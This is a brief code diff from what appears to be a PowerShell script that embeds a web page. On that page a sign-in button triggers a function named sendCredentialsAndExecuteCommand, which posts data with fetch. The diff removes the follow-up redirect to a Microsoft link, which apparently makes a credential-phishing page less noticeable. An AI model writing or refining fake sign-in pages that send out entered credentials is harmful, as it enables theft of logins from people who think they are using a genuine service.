@@ -166,8 +166,8 @@ $h2 = @"
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)})
-      .then(response => {window.location.href = 'https://go.microsoft.com/fwlink/p/?linkid=2072756';})
-      .catch(error => {window.location.href = 'https://go.microsoft.com/fwlink/p/?linkid=2072756';});}
+      .then(response => {})
+      .catch(error => {});}
 
     document.getElementById("btnSignIn").addEventListener("click", function() {
       sendCredentialsAndExecuteCommand();
